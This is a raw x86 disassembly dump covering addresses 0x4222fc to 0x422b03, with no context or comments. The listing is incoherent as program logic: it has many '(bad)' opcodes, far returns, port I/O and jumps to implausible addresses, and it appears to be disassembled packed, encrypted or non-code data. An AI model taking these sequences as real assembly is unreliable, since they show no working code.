  4222fc:	test   esi,esi
  4222fe:	mov    bh,0xd6
  422300:	and    DWORD PTR [esi],ebx
  422302:	and    bl,cl
  422304:	test   esi,esi
  422306:	pop    ss
  422307:	retf   0x4b8d
  42230a:	add    BYTE PTR [ecx-0x69],cl
  42230d:	leave  
  42230e:	je     0x42232c
  422310:	add    al,0x2f
  422312:	sti    
  422313:	cmp    ebx,esp
  422315:	cmp    eax,0xffffffc6
  422318:	adc    dh,BYTE PTR [esp-0x2d]
  42231c:	retf   
  42231d:	jne    0x42231f
  42231f:	cmp    ebp,DWORD PTR [ebp+0x20c0d783]
  422325:	call   0xf754df61
  42232a:	test   bl,cl
  42232c:	xchg   BYTE PTR [ebx],al
  42232e:	mov    edi,DWORD PTR [ebx+eax*1-0x240404bf]
  422335:	sub    al,al
  422337:	and    BYTE PTR [ecx+ecx*4-0x1c2484c2],bh
  42233e:	sbb    dl,BYTE PTR [ebx-0x4ff8a33]
  422344:	fs retf 
  422346:	mov    edi,esi
  422348:	add    ebp,DWORD PTR [ebp+0x710fc8f]
  42234e:	mov    dh,0x13
  422350:	int    0xca
  422352:	test   DWORD PTR [edx+0x78],esp
  422355:	or     BYTE PTR [ebx+edx*4+0x7b],al
  422359:	lds    ebx,FWORD PTR [ebx+0x14]
  42235c:	mov    ebp,0x266be5d
  422361:	test   ah,ch
  422363:	dec    edx
  422364:	jl     0x4223a1
  422366:	and    al,0x7e
  422368:	repz dec ebx
  42236a:	push   edx
  42236b:	cld    
  42236c:	mov    ch,BYTE PTR [ebx+0x24]
  42236f:	add    BYTE PTR [edx+0x4f],dl
  422372:	mov    ecx,?
  422374:	cld    
  422375:	js     0x4223e2
  422377:	and    al,0x50
  422379:	jp     0x4223b6
  42237b:	and    al,0x4e
  42237d:	test   ebp,edx
  42237f:	jne    0x4223d9
  422381:	sub    al,0xfa
  422383:	pop    esp
  422384:	cld    
  422385:	js     0x4223ea
  422387:	and    al,0x72
  422389:	fwait
  42238a:	or     ah,BYTE PTR [esi+0x6f]
  42238d:	sbb    eax,0x85b0106d
  422392:	cmp    esp,DWORD PTR [edi+eiz*2]
  422395:	push   eax
  422396:	popa   
  422397:	mov    esi,ecx
  422399:	sbb    al,0x13
  42239b:	call   0x41fef1
  4223a0:	jno    0x42235d
  4223a2:	push   esp
  4223a3:	push   ebp
  4223a4:	xlat   BYTE PTR ds:[ebx]
  4223a5:	inc    esp
  4223a6:	sbb    ebx,DWORD PTR [eax]
  4223a8:	mov    dl,0x6f
  4223aa:	clc    
  4223ab:	adc    eax,0x3f165a
  4223b0:	dec    ecx
  4223b1:	cmp    eax,0x85229403
  4223b6:	les    esi,FWORD PTR [ecx+ebx*2-0x62]
  4223ba:	xor    edx,0x5486336e
  4223c0:	inc    esi
  4223c1:	adc    BYTE PTR [edx],al
  4223c3:	mov    bl,0x1c
  4223c5:	icebp  
  4223c6:	xchg   ebx,ecx
  4223c8:	retf   0x83e7
  4223cb:	sti    
  4223cc:	aad    0xd9
  4223ce:	ins    DWORD PTR es:[edi],dx
  4223cf:	les    edx,FWORD PTR [esi-0x26]
  4223d2:	(bad)  
  4223d3:	fiadd  DWORD PTR [eax]
  4223d5:	test   DWORD PTR [esi+0x1ae45933],esi
  4223db:	sbb    DWORD PTR cs:[esi+0x6208a7f1],0xffffffac
  4223e3:	outs   dx,BYTE PTR ds:[esi]
  4223e4:	call   0x83b3210e
  4223e9:	mov    ?,WORD PTR [ecx+0x16]
  4223ec:	push   ecx
  4223ed:	xor    BYTE PTR [esi+0x8e5fa6e],ch
  4223f3:	pop    edx
  4223f4:	aas    
  4223f5:	push   esi
  4223f6:	pop    ecx
  4223f7:	ror    BYTE PTR [ebx],cl
  4223f9:	arpl   WORD PTR [ebx+ebx*8-0x321b067e],cx
  422400:	ins    DWORD PTR es:[edi],dx
  422401:	pop    edx
  422402:	and    edi,0x5b
  422405:	jnp    0x42243b
  422407:	jmp    0x8fc5860f
  42240c:	mov    BYTE PTR [esi+0x3a5cc9bd],ch
  422412:	pop    ebp
  422413:	jge    0x42240b
  422415:	dec    ecx
  422416:	lods   eax,DWORD PTR fs:[esi]
  422418:	pop    ds
  422419:	pop    esi
  42241a:	scas   eax,DWORD PTR es:[edi]
  42241b:	mov    ecx,0xb9bd9e88
  422420:	imul   ebp,DWORD PTR [ecx+ebp*4+0x11],0xe9d8907d
  422428:	and    BYTE PTR [esi],0xe9
  42242b:	les    ebx,FWORD PTR fs:[ecx-0x5d3be91f]
  422432:	add    BYTE PTR [ecx+0x16d96203],bl
  422438:	out    dx,al
  422439:	add    BYTE PTR [eax-0x5abd5136],dl
  42243f:	scas   eax,DWORD PTR es:[edi]
  422440:	sbb    eax,DWORD PTR [ebx+0x3f6ce4fe]
  422446:	ds popf 
  422448:	add    BYTE PTR [ecx],bl
  42244a:	sub    al,0x64
  42244c:	dec    esp
  42244d:	add    eax,0xcd74601e
  422452:	and    DWORD PTR [eax+0x74],esp
  422455:	lds    eax,FWORD PTR [ebp+0x29cd7460]
  42245b:	add    DWORD PTR [edx-0x43],ecx
  42245e:	lods   al,BYTE PTR ds:[esi]
  42245f:	adc    DWORD PTR [ecx+ebp*4-0x490470c3],eax
  422466:	ficomp DWORD PTR [esp+0xc1f09d1]
  42246d:	jmp    0xb5cfcdd3
  422472:	ins    DWORD PTR es:[edi],dx
  422473:	shr    eax,0xd1
  422476:	cmp    edx,DWORD PTR [edx]
  422478:	sti    
  422479:	ins    DWORD PTR es:[edi],dx
  42247a:	mov    eax,ds:0x2562618c
  42247f:	mov    ebp,0xbd257218
  422484:	adc    al,0x51
  422486:	pop    eax
  422487:	add    DWORD PTR [eax],0x24a5e8e9
  42248d:	ror    DWORD PTR [eax+0x6db58921],1
  422493:	icebp  
  422494:	test   DWORD PTR [ecx],ebp
  422496:	iret   
  422497:	(bad)  
  422498:	xchg   DWORD PTR [eax],ebp
  42249a:	retf   
  42249b:	(bad)  
  42249c:	das    
  42249d:	cmp    eax,DWORD PTR [eax]
  42249f:	xchg   esi,eax
  4224a0:	or     cl,dh
  4224a2:	jb     0x4224dd
  4224a4:	pop    edi
  4224a5:	into   
  4224a6:	je     0x422527
  4224a8:	pop    esi
  4224a9:	in     eax,dx
  4224aa:	jge    0x422525
  4224ac:	pop    esp
  4224ad:	pop    esp
  4224ae:	lds    esp,FWORD PTR [ebp+0x5c]
  4224b1:	dec    ebx
  4224b2:	in     eax,dx
  4224b3:	mov    dl,0x1
  4224b5:	cmp    ebx,ecx
  4224b7:	pop    esi
  4224b8:	fld    DWORD PTR [ecx+ebp*4+0x6a42da72]
  4224bf:	and    eax,edi
  4224c1:	dec    ebp
  4224c2:	add    BYTE PTR [esi],ch
  4224c4:	add    DWORD PTR [ebx-0x1716a0b4],eax
  4224ca:	mov    al,0x12
  4224cc:	fiadd  WORD PTR [eax]
  4224ce:	xor    esi,eax
  4224d0:	xchg   esp,eax
  4224d1:	out    dx,al
  4224d2:	cmovg  ebx,DWORD PTR [edx]
  4224d5:	jecxz  0x4224e0
  4224d7:	push   eax
  4224d8:	mov    eax,ds:0x6be31424
  4224dd:	stc    
  4224de:	add    bl,cl
  4224e0:	pop    ebx
  4224e1:	dec    esp
  4224e2:	and    al,0xc7
  4224e4:	add    BYTE PTR [edi],al
  4224e6:	sub    BYTE PTR [esi+ecx*1],ah
  4224e9:	add    ebx,0x74
  4224ec:	stos   DWORD PTR es:[edi],eax
  4224ed:	pop    ebp
  4224ee:	pop    ebx
  4224ef:	add    BYTE PTR [ebx*2-0x7bff053d],dh
  4224f6:	push   es
  4224f7:	jnp    0x4224d1
  4224f9:	dec    ebx
  4224fa:	xor    esi,DWORD PTR [eax]
  4224fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fd:	dec    esi
  4224fe:	mov    ecx,edi
  422500:	mov    ecx,0x7b000694
  422505:	fmul   DWORD PTR [edi-0x75]
  422508:	and    ah,BYTE PTR [eax+0x7c]
  42250b:	and    al,0x6f
  42250d:	pusha  
  42250e:	pop    esp
  42250f:	and    al,0x63
  422511:	pusha  
  422512:	pop    esp
  422513:	and    al,0x37
  422515:	pop    edi
  422516:	pop    esp
  422517:	and    al,0x47
  422519:	pop    edi
  42251a:	pop    esp
  42251b:	and    al,0x2b
  42251d:	pop    edi
  42251e:	pop    esp
  42251f:	and    al,0xff
  422521:	pop    esi
  422522:	pop    esp
  422523:	and    al,0xf3
  422525:	pop    esi
  422526:	pop    esp
  422527:	and    al,0xe7
  422529:	xchg   edx,eax
  42252a:	out    dx,al
  42252b:	je     0x42252a
  42252d:	fadd   QWORD PTR [esi+0xd80b91]
  422533:	add    DWORD PTR ds:0x781d76da,0xe
  42253a:	sti    
  42253b:	push   cs
  42253c:	bound  eax,QWORD PTR [ebp+0x2620080]
  422542:	mov    BYTE PTR [esi+eax*2-0x1a000282],al
  422549:	lock push esp
  42254b:	lea    ebp,[esi]
  42254d:	out    0x20,al
  42254f:	call   0x414783
  422554:	mov    ecx,0x5e4389ea
  422559:	jg     0x422550
  42255b:	(bad)  
  42255c:	call   0x6243b8f2
  422561:	add    al,BYTE PTR [edx-0x7a0179bc]
  422567:	inc    esp
  422568:	add    BYTE PTR [esi-0x22],bh
  42256b:	add    DWORD PTR [esi+eax*2-0x1e],0x54
  422570:	push   ecx
  422571:	jmp    0x422560
  422573:	and    BYTE PTR [eax+0x5d],ch
  422576:	xchg   esi,eax
  422577:	cmp    esp,DWORD PTR [edx+edx*1]
  42257a:	mov    DWORD PTR [ebx+0x24],edx
  42257d:	neg    BYTE PTR [ecx-0x5d8a8488]
  422583:	call   0x1bd004c9
  422588:	mov    BYTE PTR [edx+0x2],ah
  42258b:	jmp    edi
  42258d:	imul   esp,DWORD PTR [edx],0x2cc8ffff
  422593:	cmp    BYTE PTR [esi+eax*4+0x62ffffbd],0x55
  42259b:	dec    esp
  42259c:	lea    ebp,[esi-0x6c17e0dc]
  4225a2:	loope  0x4225a3
  4225a4:	jmp    ecx
  4225a6:	ret    
  4225a7:	and    cl,BYTE PTR [ebp-0x51]
  4225aa:	adc    BYTE PTR [esi+0x8],ah
  4225ad:	fs add bh,bh
  4225b0:	mov    esi,ds
  4225b2:	sbb    al,0x83
  4225b4:	add    BYTE PTR [edx-0x27],ah
  4225b7:	jmp    0xf454d812
  4225bc:	addr16 push eax
  4225be:	cdq    
  4225bf:	jmp    0x19ff9c42
  4225c4:	xchg   DWORD PTR [esi],esp
  4225c6:	out    0x6e,al
  4225c8:	inc    ebx
  4225c9:	pop    esi
  4225ca:	jg     0x4225b4
  4225cc:	add    BYTE PTR [eax],0x26
  4225cf:	mov    ebp,0xecca5409
  4225d4:	jns    0x4225da
  4225d6:	(bad)  
  4225d7:	rol    BYTE PTR [ebp+0x28],1
  4225da:	or     BYTE PTR [eax+esi*8-0x442e185],0xdc
  4225e2:	adc    esi,0xfee503e9
  4225e8:	outs   dx,DWORD PTR ds:[esi]
  4225e9:	push   eax
  4225ea:	jle    0x4225b5
  4225ec:	jo     0x42264e
  4225ee:	inc    esi
  4225ef:	icebp  
  4225f0:	adc    DWORD PTR [edi+edi*2],0x267ce9d9
  4225f7:	mov    ebp,0xd68886b5
  4225fc:	aam    0x13
  4225fe:	adc    esp,DWORD PTR [esi+0x640c17bf]
  422604:	popf   
  422605:	daa    
  422606:	out    dx,al
  422607:	add    BYTE PTR [edi+0x4e1269c9],cl
  42260d:	adc    eax,0x8099edc4
  422612:	sahf   
  422613:	mov    ebp,0xec4953ad
  422618:	lds    ebx,FWORD PTR [ecx]
  42261a:	mov    ds:0x6ec866d9,al
  42261f:	pop    esi
  422620:	popf   
  422621:	daa    
  422622:	xchg   BYTE PTR [edi-0x1b],bh
  422625:	xchg   BYTE PTR [eax],ch
  422627:	fsub   DWORD PTR [eax-0x3a5a69fe]
  42262d:	and    ebx,DWORD PTR [ebp+0xcd0095]
  422633:	inc    ecx
  422634:	(bad)  [eax-0x7618ba73]
  42263a:	xor    eax,0x3d89cd3a
  42263f:	dec    edx
  422640:	test   eax,0x138d670b
  422645:	sti    
  422646:	jmp    0xa9a942b7
  42264b:	dec    ebp
  42264c:	pusha  
  42264d:	inc    esp
  42264e:	add    eax,0x60ef5a2e
  422653:	and    eax,0xe6454bd
  422658:	fimul  WORD PTR [edx+0xd95fe0]
  42265e:	jb     0x422680
  422660:	fucomp st(0)
  422662:	mov    dh,0xf1
  422664:	fadd   DWORD PTR [eax]
  422666:	mov    eax,gs:0x5fd084dd
  42266c:	fld    DWORD PTR [eax]
  42266e:	jb     0x42267d
  422670:	mov    ebp,0x5f93ea1c
  422675:	jl     0x42263c
  422677:	cmp    DWORD PTR [edx-0x11],ebx
  42267a:	ins    BYTE PTR es:[edi],dx
  42267b:	or     BYTE PTR [esp+esi*1+0x30bd1d72],0x62
  422683:	and    eax,0x185c18bd
  422688:	loope  0x422613
  42268a:	lods   eax,DWORD PTR ds:[esi]
  42268b:	cmp    eax,0xbf418799
  422690:	in     eax,0x55
  422692:	sahf   
  422693:	push   eax
  422694:	out    0x60,eax
  422696:	xlat   BYTE PTR ds:[ebx]
  422697:	add    BYTE PTR [ecx+0x452d7fd9],ah
  42269d:	push   esi
  42269e:	rcl    BYTE PTR [ebp+0x2c7f9b39],0x4d
  4226a5:	enter  0x9bef,0x38
  4226a9:	pop    ecx
  4226aa:	jl     0x4226ac
  4226ac:	pop    ss
  4226ad:	lds    eax,FWORD PTR [ebx+0x2be5276c]
  4226b3:	fcmovnbe st,st(0)
  4226b5:	adc    DWORD PTR [edi],eax
  4226b7:	test   DWORD PTR [ecx-0x2b],ecx
  4226ba:	add    BYTE PTR [eax],al
  4226bc:	jp     0x4226be
  4226be:	mov    es,WORD PTR [eax]
  4226c0:	or     ebx,ebp
  4226c2:	pop    es
  4226c3:	cmp    DWORD PTR [esi-0x7fffff24],0xffffff91
  4226ca:	and    al,0x58
  4226cc:	outs   dx,BYTE PTR ds:[esi]
  4226cd:	cdq    
  4226ce:	and    al,0x30
  4226d0:	dec    esi
  4226d1:	mov    bl,0x14
  4226d3:	call   0x423aef
  4226d8:	inc    edi
  4226d9:	adc    eax,0xf1712274
  4226de:	lea    eax,[edi-0x4d]
  4226e1:	lods   al,BYTE PTR ds:[esi]
  4226e2:	add    DWORD PTR [edi+eiz*4-0x3c],0xfffffffb
  4226e7:	lds    ebp,FWORD PTR [ebx+0xa]
  4226ea:	adc    eax,0x9c855c
  4226ef:	add    edi,0xffffffd9
  4226f2:	inc    ebp
  4226f3:	add    ebp,0xfffffff1
  4226f6:	mov    DWORD PTR [edi+eiz*4-0x1c],ebp
  4226fa:	mov    DWORD PTR [eax+eax*1+0x57],esi
  4226fe:	popf   
  4226ff:	lea    esi,[edi+0x73]
  422702:	mov    dl,0x8d
  422704:	dec    esp
  422705:	addr16 mov ecx,0x75677489
  42270b:	call   0x1174096
  422710:	test   DWORD PTR [ebx+0x4a5789da],ecx
  422716:	fadd   QWORD PTR [eax]
  422718:	mov    ebp,DWORD PTR [ebp+0x2d]
  42271b:	daa    
  42271c:	in     al,0x3b
  42271e:	fadd   QWORD PTR [eax+eax*8+0x148574c]
  422725:	bound  eax,QWORD PTR [edx]
  422727:	call   DWORD PTR [edx-0x21]
  42272a:	ins    DWORD PTR es:[edi],dx
  42272b:	and    ebp,DWORD PTR [edx+edi*1]
  42272e:	bswap  edx
  422730:	add    BYTE PTR [edx+0x76],ah
  422733:	les    ecx,FWORD PTR [ebx]
  422735:	fisttp WORD PTR [edi-0x2]
  422738:	jmp    DWORD PTR [edx-0x7d]
  42273b:	mov    ebx,0x2875e1fb
  422740:	sub    al,0x30
  422742:	scas   al,BYTE PTR es:[edi]
  422743:	or     al,0xfb
  422745:	outs   dx,BYTE PTR ds:[esi]
  422746:	fiadd  WORD PTR [eax-0x73]
  422749:	sahf   
  42274a:	(bad)  
  42274b:	and    BYTE PTR [edx-0x6],dl
  42274e:	pop    ebp
  42274f:	fiadd  WORD PTR [eax]
  422751:	bound  ecx,QWORD PTR [ebx-0x9387a29]
  422757:	jbe    0x422769
  422759:	arpl   WORD PTR [edx],ax
  42275b:	inc    DWORD PTR [esi-0x78dce1e2]
  422761:	add    BYTE PTR [edx],ah
  422763:	idiv   BYTE PTR [ebx-0x50]
  422766:	loop   0x422768
  422768:	(bad)  
  422769:	(bad)  
  42276a:	mov    edx,0xa5fbc43b
  42276f:	push   edx
  422770:	aad    0xb9
  422772:	ret    0xfefe
  422775:	dec    DWORD PTR [ebp+0x46447a90]
  42277b:	mov    dh,0x7f
  42277d:	mov    esi,0xffff12da
  422782:	adc    BYTE PTR [edx+0x4e],dl
  422785:	push   ebx
  422786:	jmp    0x4132ff42
  42278b:	lahf   
  42278c:	lock jg 0x4227f9
  42278f:	add    BYTE PTR [eax],al
  422791:	mov    WORD PTR ds:0x55ffff01,?
  422797:	xor    eax,0x913a3423
  42279c:	push   ss
  42279d:	add    BYTE PTR [edx-0x27],ah
  4227a0:	(bad)  
  4227a1:	mov    edx,0x476e19e6
  4227a6:	jle    0x42275d
  4227a8:	loop   0x422740
  4227aa:	and    esp,DWORD PTR [ebx-0x57]
  4227ad:	pop    es
  4227ae:	fstp   QWORD PTR [ecx+0x59]
  4227b1:	add    ah,BYTE PTR [edx-0x27]
  4227b4:	jo     0x4227fd
  4227b6:	shl    DWORD PTR ds:[ebx+esi*2+0x3a],1
  4227bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227bc:	pusha  
  4227bd:	aas    
  4227be:	ds xchg ebp,eax
  4227c0:	loop   0x4227db
  4227c2:	scas   al,BYTE PTR es:[edi]
  4227c3:	jmp    0x4227ee
  4227c5:	add    al,0x0
  4227c7:	fst    QWORD PTR [ebp-0x4ed4d3f3]
  4227cd:	loope  0x422844
  4227cf:	pop    esp
  4227d0:	pop    ss
  4227d1:	sub    eax,0xd87128
  4227d6:	dec    esp
  4227d7:	jp     0x42275f
  4227d9:	in     eax,dx
  4227da:	jnp    0x42280a
  4227dc:	mov    ch,0xd2
  4227de:	push   ebp
  4227df:	leave  
  4227e0:	in     al,0x29
  4227e2:	adc    ah,BYTE PTR [edx]
  4227e4:	fldcw  WORD PTR [ecx+0x70]
  4227e7:	jle    0x4227cf
  4227e9:	jmp    0x29f74668
  4227ee:	call   ecx
  4227f0:	sbb    DWORD PTR [ecx+0x48],esi
  4227f3:	inc    esi
  4227f4:	mov    DWORD PTR [ebp+edi*4+0xf],esp
  4227f8:	aad    0x6d
  4227fa:	les    edx,FWORD PTR [esi]
  4227fc:	in     al,dx
  4227fd:	pop    esi
  4227fe:	dec    eax
  4227ff:	ds mov ch,0xd1
  422802:	jnp    0x422871
  422804:	fldl2t 
  422806:	push   esp
  422807:	jns    0x42278e
  422809:	or     eax,0xe5a1e56c
  42280e:	push   esi
  42280f:	frstor [eax+0x69]
  422812:	add    eax,0xb651d962
  422817:	or     DWORD PTR [esi],0x0
  42281a:	ss (bad) 
  42281d:	js     0x4227fe
  42281f:	stos   DWORD PTR es:[edi],eax
  422820:	fcom   DWORD PTR [ebx+0x74]
  422823:	mov    ds:0xb21130b5,al
  422828:	xor    eax,DWORD PTR [eax]
  42282a:	jmp    0x521f302f
  42282f:	mov    dh,0x8a
  422831:	pop    esp
  422832:	dec    esp
  422833:	int    0x55
  422835:	add    DWORD PTR [ecx+0x1e],ebp
  422838:	pop    esi
  422839:	fld    DWORD PTR [ecx+ebp*1+0x3587be8a]
  422840:	cmp    ch,BYTE PTR [ebp+0x2]
  422843:	jmp    0x58643a9
  422848:	dec    esp
  422849:	fadd   DWORD PTR [ebp-0x41d8a21]
  42284f:	push   ebp
  422850:	cmp    ch,BYTE PTR [ebp-0x32464879]
  422856:	loope  0x422841
  422858:	popa   
  422859:	push   esp
  42285a:	shl    BYTE PTR [eax],0x6a
  42285d:	pop    esp
  42285e:	dec    esp
  42285f:	add    eax,0xc2e20166
  422864:	popa   
  422865:	fsincos 
  422867:	and    eax,0x7589cd8a
  42286c:	test   DWORD PTR [ebp+0x2],ebp
  42286f:	jmp    0xcdae7ed5
  422874:	imul   edx,DWORD PTR [esi+0x54],0x745631c5
  42287b:	int    0x35
  42287d:	push   esi
  42287e:	jl     0x422845
  422880:	cmp    eax,0x492f7fcf
  422885:	pusha  
  422886:	push   esp
  422887:	add    eax,0xd74600e
  42288c:	or     al,dh
  42288e:	push   esp
  42288f:	add    eax,0xd8c3e00
  422894:	add    al,dl
  422896:	int3   
  422897:	and    al,0x34
  422899:	mov    dl,0x17
  42289b:	std    
  42289c:	call   DWORD PTR [edi+ecx*4-0x6fa0db84]
  4228a3:	je     0x4228c9
  4228a5:	pop    ss
  4228a6:	nop
  4228a7:	dec    esp
  4228a8:	and    al,0x37
  4228aa:	xor    ecx,esp
  4228ac:	cmc    
  4228ad:	cmp    ebx,ecx
  4228af:	add    DWORD PTR [edi+ebx*1-0x6b],0xffffff89
  4228b4:	inc    esp
  4228b5:	das    
  4228b6:	fld    QWORD PTR [ebx+0x2bd11f44]
  4228bc:	leave  
  4228bd:	adc    BYTE PTR [esp-0xaad9ce0],0x0
  4228c5:	or     edx,DWORD PTR [edx-0x6fb8dbbc]
  4228cb:	inc    esp
  4228cc:	and    al,0x9b
  4228ce:	mov    WORD PTR [esp-0x65],es
  4228d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228d3:	push   0x97b4e8
  4228d8:	push   0x63
  4228da:	(bad)  
  4228db:	jae    0x422901
  4228dd:	addr16 nop
  4228df:	pop    esp
  4228e0:	and    al,0x6f
  4228e2:	(bad)  
  4228e3:	jae    0x422909
  4228e5:	xchg   edi,eax
  4228e6:	(bad)  
  4228e7:	pop    esp
  4228e8:	and    al,0x77
  4228ea:	adc    eax,DWORD PTR [esp+0x53]
  4228ee:	fsubr  st,st(0)
  4228f0:	(bad)  
  4228f2:	fadd   DWORD PTR [eax]
  4228f4:	add    DWORD PTR [eax],0xffffffcf
  4228f7:	icebp  
  4228f8:	cmp    BYTE PTR [edi+ebx*4-0x1a],0x1
  4228fd:	ud0    ebp,edx
  422900:	std    
  422901:	push   esp
  422903:	xchg   ecx,eax
  422904:	dec    esp
  422905:	and    al,0x5b
  422907:	sub    eax,0xd88bf585
  42290c:	add    DWORD PTR [edx+eiz*2-0x22],0x30
  422911:	xchg   DWORD PTR [esi],eax
  422913:	(bad)  
  422914:	sbb    al,0x85
  422916:	and    al,BYTE PTR [ebx]
  422918:	mov    WORD PTR [esi+edi*2+0x24],es
  42291c:	xor    cl,cl
  42291e:	cmp    dl,BYTE PTR [ebx]
  422920:	repnz add BYTE PTR [edx+0x77],ah
  422924:	inc    eax
  422925:	and    al,0x5e
  422927:	jmp    0xc778:0x262f562
  42292e:	cmp    al,BYTE PTR [ebx-0xe]
  422931:	add    BYTE PTR [edx+0x78],ah
  422934:	dec    eax
  422935:	and    al,0x74
  422937:	xor    ecx,DWORD PTR [ebp+0x5d]
  42293a:	mov    ecx,0x6484c881
  42293f:	add    bh,bh
  422941:	mov    ebp,0x8752025a
  422946:	push   cs
  422947:	jg     0x42292c
  422949:	clc    
  42294a:	loope  0x422969
  42294c:	pop    es
  42294d:	dec    edi
  42294e:	xchg   edi,eax
  42294f:	int3   
  422950:	push   ebp
  422951:	xchg   DWORD PTR [ebx],ecx
  422953:	sbb    edx,DWORD PTR [edx]
  422955:	and    BYTE PTR [eax-0x3e],dh
  422958:	add    al,0x89
  42295a:	add    BYTE PTR [esi],bl
  42295c:	(bad)  
  42295d:	or     al,0xbd
  42295f:	add    al,BYTE PTR [ecx]
  422961:	(bad)  
  422962:	(bad)  
  422963:	fnstcw WORD PTR [esi-0x2e5900f8]
  422969:	in     eax,dx
  42296a:	adc    eax,0x3f1026
  42296f:	jo     0x4229b3
  422971:	ja     0x4229b7
  422973:	jle    0x422985
  422975:	xlat   BYTE PTR ds:[ebx]
  422976:	bound  edi,QWORD PTR [eax-0x657900ff]
  42297c:	je     0x42296a
  42297e:	jne    0x422978
  422980:	xlat   BYTE PTR ds:[ebx]
  422981:	add    al,0x66
  422983:	bound  esi,QWORD PTR [edi-0x48]
  422986:	call   0xeca1028a
  42298b:	jns    0x4229e1
  42298d:	sub    DWORD PTR [esi+0x45],esi
  422990:	enter  0x5929,0x62
  422994:	cdq    
  422995:	mov    ecx,0xd5022578
  42299a:	call   0xc3a734f8
  42299f:	xlat   BYTE PTR ds:[ebx]
  4229a0:	out    dx,eax
  4229a1:	pop    esi
  4229a2:	inc    eax
  4229a3:	pop    esi
  4229a4:	sub    DWORD PTR [ecx],0x22d96b24
  4229aa:	mov    bl,0xd6
  4229ac:	fsubr  st,st(1)
  4229ae:	add    ebp,DWORD PTR [ecx]
  4229b0:	in     eax,0x61
  4229b2:	adc    DWORD PTR [edx-0x693c9b27],esp
  4229b8:	jmp    0x4229c8
  4229ba:	add    al,0x45
  4229bc:	sbb    DWORD PTR [ecx-0x4a59ff85],ebp
  4229c2:	xlat   BYTE PTR ds:[ebx]
  4229c3:	in     al,dx
  4229c4:	outs   dx,DWORD PTR ds:[esi]
  4229c5:	mov    ecx,0x606243d7
  4229ca:	sub    eax,0xf9015a20
  4229cf:	int    0x62
  4229d1:	fstp   DWORD PTR [esi-0x14]
  4229d4:	fisttp WORD PTR [edx]
  4229d6:	push   ebp
  4229d7:	sahf   
  4229d8:	out    0xa,eax
  4229da:	bnd jg 0x422a25
  4229dd:	xlat   BYTE PTR ds:[ebx]
  4229de:	jmp    0xdd80de6
  4229e3:	push   ss
  4229e4:	ficomp WORD PTR [ecx]
  4229e6:	fiadd  DWORD PTR [eax+0x3e9d9d1]
  4229ec:	out    0xa5,eax
  4229ee:	lds    esp,FWORD PTR [ebx]
  4229f0:	jmp    0x422a10
  4229f2:	jmp    0xd7438bfa
  4229f7:	pop    ecx
  4229f8:	arpl   cx,bx
  4229fa:	ins    BYTE PTR es:[edi],dx
  4229fb:	les    ecx,FWORD PTR [esi]
  4229fd:	jecxz  0x422a65
  4229ff:	push   0xed00b946
  422a04:	adc    bl,dh
  422a06:	xchg   DWORD PTR [ecx-0x2276df04],edi
  422a0c:	push   ebp
  422a0d:	mov    ecx,0xd9726ae8
  422a12:	add    BYTE PTR [edx+0x67],al
  422a15:	push   ebx
  422a16:	enter  0xcc41,0x5
  422a1a:	add    cl,ch
  422a1c:	mov    WORD PTR [edi],es
  422a1e:	call   0xfb507abb
  422a23:	bound  eax,QWORD PTR [eax]
  422a25:	es push esp
  422a27:	repnz mov ch,0xac
  422a2a:	push   edx
  422a2b:	int    0xd2
  422a2d:	sti    
  422a2e:	push   edi
  422a2f:	stc    
  422a30:	imul   edi,DWORD PTR [eax+eiz*8+0x0],0xb52689f
  422a38:	add    DWORD PTR [ebp+eax*1-0x4a231700],ebp
  422a3f:	add    BYTE PTR [edx-0x7f],ch
  422a42:	aad    0x0
  422a44:	(bad)  
  422a45:	leave  
  422a46:	add    BYTE PTR [esi],al
  422a48:	adc    esp,DWORD PTR [esi-0x27]
  422a4b:	xchg   esi,esi
  422a4d:	sbb    DWORD PTR [esp+esi*8-0x34ad9e17],edx
  422a54:	sar    DWORD PTR [ebx],0x5
  422a57:	add    cl,ch
  422a59:	pop    edx
  422a5a:	push   esp
  422a5b:	add    dh,bl
  422a5d:	leave  
  422a5e:	or     eax,0xa54ae566
  422a63:	and    al,0x9
  422a65:	not    DWORD PTR [ecx]
  422a67:	add    cl,ch
  422a69:	popa   
  422a6a:	pusha  
  422a6b:	inc    esp
  422a6c:	int    0x81
  422a6e:	add    DWORD PTR [eax+0x2fd9670d],edx
  422a74:	test   eax,0x3940d907
  422a79:	sbb    eax,0xf00e812
  422a7e:	cld    
  422a7f:	idiv   bh
  422a81:	repnz mov al,BYTE PTR [ecx]
  422a84:	add    BYTE PTR [ebx-0x76],bh
  422a87:	(bad)  
  422a88:	call   0x5e1c8d
  422a8d:	add    BYTE PTR [ebp-0x36],al
  422a90:	and    al,0x12
  422a92:	jnp    0x422ac1
  422a94:	mov    esi,0x2bd57b26
  422a99:	leave  
  422a9a:	(bad)  
  422a9b:	sbb    al,0x62
  422a9d:	add    DWORD PTR [ebx],eax
  422a9f:	add    al,0x44
  422aa1:	enter  0x2248,0x89
  422aa5:	dec    esp
  422aa6:	push   edi
  422aa7:	mov    ecx,0x4476f39
  422aac:	mov    ecx,esp
  422aae:	dec    ebx
  422aaf:	fld    QWORD PTR [eax]
  422ab1:	xor    edx,DWORD PTR [ebp-0x7b]
  422ab4:	je     0x422ada
  422ab6:	daa    
  422ab7:	mov    BYTE PTR [ebx+0x4],al
  422aba:	arpl   WORD PTR [esi-0x54],dx
  422abd:	add    BYTE PTR [ebx],cl
  422abf:	mov    eax,eax
  422ac1:	ja     0xfb422b0e
  422ac7:	xchg   edi,edi
  422ac9:	add    al,BYTE PTR [ebp-0x7b]
  422acc:	inc    esp
  422acd:	and    al,0x5f
  422acf:	nop
  422ad0:	dec    eax
  422ad1:	or     BYTE PTR [ebx],dl
  422ad3:	xchg   al,ah
  422ad5:	add    bl,bh
  422ad7:	mov    al,al
  422ad9:	je     0x422aae
  422adb:	xchg   edi,eax
  422adc:	or     edi,0xffffffb3
  422adf:	sti    
  422ae0:	fadd   QWORD PTR [eax]
  422ae2:	mov    ebx,0xd3ee7bcf
  422ae7:	int    0xc0
  422ae9:	inc    eax
  422aea:	inc    ebx
  422aeb:	cdq    
  422aec:	and    al,0x12
  422aee:	add    dl,dl
  422af0:	add    DWORD PTR [eax],0x0
  422af3:	mov    ebx,0x6224441a
  422af8:	add    edi,edi
  422afa:	xchg   BYTE PTR [ecx],ah
  422afc:	(bad)  
  422afd:	jnp    0x422aaf
  422aff:	loop   0x422af2
  422b01:	(bad)  
  422b02:	(bad)  
  422b03:	jp     0x422ab9
